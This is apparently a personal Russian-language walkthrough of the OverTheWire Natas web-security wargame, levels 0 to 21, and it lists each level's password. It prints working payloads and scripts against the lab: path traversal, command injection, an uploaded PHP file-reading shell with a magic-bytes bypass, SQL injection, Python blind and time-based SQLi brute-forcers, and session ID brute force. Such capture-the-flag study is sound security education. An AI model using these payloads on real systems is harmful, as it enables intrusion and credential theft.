natas0:
Information Disclosure
HTML -> scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7

natas1:
Information Disclosure
HTML -> vsDOxoXyq3wckCP1ZmTZ71ngIA606odB

natas2:
Directory Listing
Грубо, но всё же.

ffuf -u http://natas2.natas.labs.overthewire.org/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 403 -H "Authorization: Basic bmF0YXMyOnZzRE94b1h5cTN3Y2tDUDFabVRaNzFuZ0lBNjA2b2RC" -> natas2.natas.labs.overthewire.org/files/users.txt -> K30JrSRHzjxq3paUQuwozY4MNvmNFyhI

natas3:
Directory Listing
/robots.txt -> /s3cr3t -> JDrPnuZAKyl6MkiqQGFIddrqpvgOASth (можно тем же ffuf)

natas4:
HTTP-header spoofing
пишем get-запрос на подмену Referer

echo "GET / HTTP/1.1\r\nHost: natas4.natas.labs.overthewire.org\r\nAuthorization: Basic bmF0YXM0OkpEclBudVpBS3lsNk1raXFRR0ZJZGRycXB2Z09BU3Ro\r\nConnection: close\r\nReferer: http://natas5.natas.labs.overthewire.org/\r\n\r\n" | ncat natas4.natas.labs.overthewire.org 80 -> e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
или
curl -H "Authorization: Basic bmF0YXM0OkpEclBudVpBS3lsNk1raXFRR0ZJZGRycXB2Z09BU3Ro" -H "Referer: http://natas5.natas.labs.overthewire.org"

natas5:
Cookie Tampering
хранилище -> куки -> loggedin: 1 -> 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT

natas6:
утечка пути к include file
http://natas9.natas.labs.overthewire.org/index-source.html -> /includes/secret.inc -> $ secret = FOEIUWGHFEEUHOFUOIU -> if($secret == $_ POST\['secret'\]) (сравнивает полученное значение с переменной secret) -> B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0

natas7:
LFI / Path Traversal
из html и во время переключения по вкладкам (about, home) понимаем что мы имеем прямой доступ к серверу из-за передачи страниц через GET-параметр в URL-> http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 -> ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc

natas8:
простое шифрование
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";      function encodeSecret($secret) {       return bin2hex(strrev(base64_encode($secret)));   }      if(array_key_exists("submit", $_POST)) {       if(encodeSecret($_POST['secret']) == $encodedSecret)`
```
расшифровываем в обратном порядке от того как он зашифровывалось (bin2hex -> strrev -> base64_encode)

xxd -r -p -> rev -> base64 -d -> oubWYf2kBq -> UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

natas9:
Command Injection
`if(array_key_exists("needle", $_REQUEST)) {$key = $_REQUEST["needle"];}
if($key != "") {passthru("grep -i $key dictionary.txt");}`

key - может быть любым и передаваться из POST/GET/cookies
passthru - очень уязвима, выполняет команды напрямую в консоли. Мы можем подставлять только key. Как можно проэксплуатировать? 
key = "." /etc/natas_webpass/natas10 #  -> EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

natas10:
Command Injection
тоже самое -> VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd

natas11:
XOR-encryption
`if($data["showpassword"] == "yes") { print "The password for natas12 is <censored><br>"; }`
цель: $data\["showpassword"\] == "yes"

откуда $data?
`$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");`
`$data = loadData($defaultdata);`
что делает loadData? на первом проходе она просто возвращает, то что ей и отдали, в последующих расшифровывает переданное cookie и перезаписывает в том числе и -"showpassword". Хорошо, значит надо передать такое cookie, чтобы "showpassword"=>"yes"

как записываются cookie? `function saveData($d) { setcookie("data", base64_encode(xor_encrypt(json_encode($d)))); }`. т.е. переводятся в json формат -> шифруются -> кодируются -> переводятся в URL-формат

т.е. изначальный текст:
("showpassword"=>"no", "bgcolor"=>"#ffffff") превратили в EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D (cookie)

как найти ключ xor-шифрования? 
1) декодировать cookie из URL-формата -> отправить в base64_decode(чтобы выдало сырые биты)-> шифротекст
2) $defaultdata -> json_encode("showpassword"=>"no", "bgcolor"=>"#ffffff") ->{"showpassword":"no","bgcolor":"#ffffff"} (это текст после применения xor-ключа) -> открытый текст
3) воспользоваться свойством: открытый_текст ^ шифротекст = ключ

лучше написать код на php:
```php
<?php
$plain_text = '{"showpassword":"no","bgcolor":"#ffffff"}';
print base64_decode('EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=') ^ $plain_text;` -> kBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwk -> ключ = kBSw
```
зашифруем:
```php
<?php
function xor_encrypt($in){
    $key = 'kBSw';
    $text = $in;
    $outText = '';
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}
print base64_encode(xor_encrypt('{"showpassword":"yes","bgcolor":"#ffffff"}'));
?>
```
-> EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/ -> EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F -> подменяем cookie -> EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng

*URL-формат - Строка внутри HTTP-заголовка проходит через URL-кодирование (URL-encoding). Браузеры и серверы автоматически кодируют спецсимволы, чтобы они не нарушали структуру HTTP-запроса.*
![[Pasted image 20260930125132.png|178]]

natas12:
Arbitrary File Upload
разбираем код
`$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);`
И
`<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />` 
сервер POST-запросом берёт данные с обычной HTML-формы и делает рандомный путь к файлу основываясь на этом POST-запросе (не меняя при этом суффикс)

`move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path`)
сервер перемещает полученный файл с формы в некоторый путь

html можно изменять и в том числе изменить value -> можно заливать на сервер всё, что угодно -> напишем скрипт на php
```php
<?php
print file_get_contents("/etc/natas_webpass/natas13");
?>
```
-> закидываем скрипт -> переименовываем value как что-то.php -> upload file -> запускаем скрипт -> g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

natas13:
Magic Bytes Bypass
For security reasons, we now only accept image files!
А какая функция проверяет и как?
`exif_imagetype`, прикол в том, что проверяет только начальную сигнатуру файлов. Значит, можно внедрить что-то после начальной сигнатуры(предварительно посмотрев сигнатуры файлов(например GIF/PNG/JPEG)) или внедрить в метаданные. 
Я внедрил после сигнатуры: `GIF89a<?php print file_get_contents("/etc/natas_webpass/natas14"); ?>` 
-> закидываем на сервер по прошлой схеме -> A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8

natas14:
In-band sql-injection`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";`

SQLi в username: " OR "1" = "1" -- -> GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
SQLi в password: " OR "1"="1 -> GB6USCJYJjwLyYhZUNkE1NwDueiTow6g

natas15:
Boolean-Based Blind SQLi
приложение не возвращает результаты SQL-запроса или сведения об ошибках базы данных в своих ответах. Окей, но приложение возвращает есть такой пользователь или нет (natas16 есть, нетрудно догадаться) это и будет основой уязвимости: можно вставить проверку на символ в пароле с помощью SQLi, smth like: natas16" and password like binary "a%" --

Вручную делать не будем, напишем скрипт на Python (можно кста на bash с ncat, но это тяжелее распарсить)(сука, ты меня заебал):
```python
import requests

def choose_char(num):
    s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    if num >= len(s):
        exit(0)
    return s[num]

num = 0
cnt = 0
a = ''
while True:
    a += choose_char(num)
    headers = {
        'Authorization': 'Basic bmF0YXMxNTpHQjZVU0NKWUpqd0x5WWhaVU5rRTFOd0R1ZWlUb3c2Zw=='
    }
    payload = {
        'username': 'natas16" and password like binary "' + a + '%" -- '
    }
    response = requests.post("http://natas15.natas.labs.overthewire.org/", data=payload, headers=headers)
    if "This user exists" in response.text:
        print(choose_char(num), end="",flush=True)
        cnt += 1
        num=0
    else:
        if a=='':
            a = ''  
        a = a[:cnt]
        num += 1
```
-> Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb

natas16:
Blind Command Injection
![[Pasted image 20261004163137 1.png|202]]
рассуждения как в natas10/9, но теперь нам как-будто всё ограничили

1) т.к. $key заключают в кавычки, то вспоминаем про Command substitution: $(...) подставляет результат команды ... в какое-либо место. Также и для кавычек -> вместо $key можно подставить команду, которая в /etc/natas_webpass/natas17 ищет знак и узнаёт есть ли такой по выводу словаря -> $(grep -o знак /etc/natas_webpass/natas17) 
2) Но вопрос, как узнать на каком месте стоит знак? Помогут нам regex (для grep флаг -P или -E) -> $(grep -o -P ^.{n}знак.* /etc/natas_webpass/natas17)

	разбор ^.{n}знак.\*\:
	^ - строка начинает с...
	.{n} - перед знаком есть n каких-либо знаков
	.* - после знака есть какое-либо количество различных знаков (т.к. * работает только с предыдущим элементом, то ставим точку которая обозначает какой-либо знак)
	^.{n}знак.* - строка начинается с n каких-либо знаков, после них идёт заданный знак, а после идёт какое-либо количество элементов
	
3) Ещё одна проблема... regex будет выдавать в поиск полный пароль или пустую строку. В двух вариантах приложение не будет ничего выдавать -> находим функцию конкатенации $(...)text эта конструкция выводит результат работы команды соединяя всё с text -> при проверке в словаре например, "password" находим, что существуют такие вхождения -> при не нахождении знака будут выводиться вхождения password в словарь, при нахождении не будут выводиться.
4) осталось написать скрипт, который перебирает все n и все знаки:
```python
import requests

def choose_char(num):
    s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    if num >= len(s):
        exit(0)
    return s[num]

n = 0
num = 0
while True:
    a = choose_char(num)
    headers = {
        'Authorization': 'Basic bmF0YXMxNjpYbTZYRWVSTjN6c0dqUkRxQlBtdXFBVlY2NWs3ZTNHYg=='
    }
    payload = {
        'needle': '$(grep -o -P ^.{' + f"{n}" + '}' + a + '.* /etc/natas_webpass/natas17)password'
    }
    response = requests.post("http://natas16.natas.labs.overthewire.org/", data=payload, headers=headers)
    
    num += 1
    if not("password" in response.text):
        print(a, end="", flush=True)
        num = 0
        n += 1
``` 
-> KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx

wrong alternative solve №1 (к которому я пришёл): $(diff -q <(grep -o знак /etc/natas_webpass/natas17) <(cut -c n /etc/natas_webpass/natas17))password -> выполняет ровно обратный функционал. Но к сожалению это не работает, из-за того что diff выводит строку вида: `Files /dev/fd/63 and /dev/fd/62 differ`, поэтому grep считает /dev/fd за директории

alternative solve №2:
пройдя всю ту же цепочку размышлений можно было прийти к конструкции $(grep -P ^string /etc/natas_webpass/natas17) -> выполняет такой же функционал (string - уже найденная строка)

natas17:
Time-Based Blind SQLi
изучаем виды SQLi, команду SLEEP, конструкцию case when then else end -> основная SQLi: natas18" and (case when password like binary "a%" then sleep(3) end) -- -> не буду всё объяснять, в коде видно. (Устойчив к стандартным сетевым ошибкам)
```python
import requests
import time

def choose_char(num):
    s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    if num >= len(s):
        exit(0)
    return s[num]

num = 0
cnt = 0
a = ''
while True:
    a += choose_char(num)
    headers = {
        'Authorization': 'Basic bmF0YXMxNzpLTGRBTTNWWnV4OG82VGJrYmh1YUc1S3RZakk3N3RmeA=='
    }
    payload = {
        'username': 'natas18" and (case when password like binary "' + a + '%" then sleep(3) end) -- '
    }

    start = time.perf_counter()
    try:      requests.post("http://natas17.natas.labs.overthewire.org/", data = payload, headers = headers)
    except requests.RequestException:
        num=0
        a = a[:cnt]
        end = time.perf_counter()
        continue
    end = time.perf_counter()

    if(end - start > 3):
        print(choose_char(num), end="", flush=True)
        num=0
        cnt+=1
    else:
        if a == '':
            a = ''
        a = a[:cnt]
        num+=1
```
-> fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op

natas18:
Session Fixation
`if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)` -> нужно зайти под админом + чтобы был флаг админа, но у нас нет ни одной строчки кода которая бы устанавливала нам админский флаг -> в блоке else в основной части кода всегда устанавливается 0, значит нам надо попасть сразу в `if(my_session_start())`, функция возвращает true только если уже есть установленные cookie (ID пользователя) -> замечаем, что ID у пользователя всего 640 различных значений, можно предположить, что админ залогинился под одним из ID -> перебираем все ID с помощью скрипта (сессия напрямую привзязана к ID) (ID у пользователя, а сессия в базе данных)
```python
import requests

i = 1
while True:
    cookies = {
        'PHPSESSID': f'{i}'
    }
    headers = {
        'Authorization': 'Basic bmF0YXMxODpmREduMkE2R3NjMEJVcDNiWncwUk5YcGcwUFp0NDBvcA=='
    }
    response = requests.get("http://natas18.natas.labs.overthewire.org/", headers=headers, cookies=cookies)
    
    if "You are an admin" in response.text:
        print(i)
        exit(0)
    else:
        i+=1
```
-> 119 -> qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT

natas19:
Hard Session Fixation
та же логика, но придётся выучить новую функцию в питоне(
```python
import requests

i = 1
while True:
    text = f'{i}-admin'
    headers = {
        "Authorization": "Basic bmF0YXMxOTpxdnd0TXFBY1ZTQmxmN0hFM3N3OXBsamhxcVBGOU1NVA=="
    }
    payload = {
        "PHPSESSID": text.encode('utf-8').hex()
    }
    response = requests.get("http://natas19.natas.labs.overthewire.org/", headers=headers, cookies=payload)
    if "You are an admin. The credentials for" in response.text:
        print(i)
        print(text.encode('utf-8').hex())
        exit(0)
    else:
        i+=1
```
-> 3238312d61646d696e -> slOKYGsjlJhaqKliGvrgWAzln0JyrWao

natas20:
Session Injection
1) При записи (`mywrite`) данные из массива `$_SESSION` сохраняются в текстовый файл построчно в формате: `ключ значение\n`.
2) При чтении (`myread`) сервер разбивает этот файл по символу новой строки (`\n`), а затем разделяет каждую строчку пробелом на имя переменной и её значение.
3) т.к. данные не фильтруются можно передать например "admin\nadmin 1". $\_SESSION будет выглядеть так: {"name": "admin", "admin": 1}. Это то что нам нужно, записываем это в файл, а потом обращаемся к тому же файлу через get-запрос с таким же cookie.
4) решение на питоне:
```python
import requests
headers = {
    "Authorization": "Basic bmF0YXMyMDpzbE9LWUdzamxKaGFxS2xpR3ZyZ1dBemxuMEp5cldhbw=="
}
payload = {
    "name": "admin\nadmin 1"
}
cookie = {
    "PHPSESSID": "1"
}
response = requests.post("http://natas20.natas.labs.overthewire.org/?debug", headers=headers, data=payload, cookies=cookie)
response2 = requests.get("http://natas20.natas.labs.overthewire.org/?debug", headers=headers, cookies=cookie)

print("POST-запрос")
print(response.text)
print("GET-запрос")
print(response2.text)
```
-> 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU

natas21:
XSS
